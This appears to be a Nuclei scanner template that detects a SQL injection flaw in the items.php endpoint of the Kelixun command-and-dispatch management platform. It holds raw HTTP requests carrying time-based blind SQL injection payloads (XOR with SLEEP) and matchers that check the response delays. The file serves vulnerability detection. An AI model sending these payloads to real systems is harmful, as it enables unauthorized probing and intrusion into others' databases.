id: kelixun-items-sqli

info:
  name: 福建科立讯通信指挥调度管理平台 items.php 存在SQL注入漏洞
  author: kelixun
  severity: high
  tags: kelixun

http:
  - raw:
      - |+
        GET /api/get_sos/items.php?sign=2&timestamp=1&usernumber=1'XOR(if(now()=sysdate(),SLEEP(2),0))XOR'A HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close

      - |+
        GET /api/get_sos/items.php?sign=2&timestamp=1&usernumber=1'XOR(if(now()=sysdate(),SLEEP(4),0))XOR'A HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close


    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=2 && duration_1<4'  
          - 'duration_2>=4 && duration_2<6'
        condition: and
      - type: word
        part: body
        words:
          - '"code":"'
        condition: and

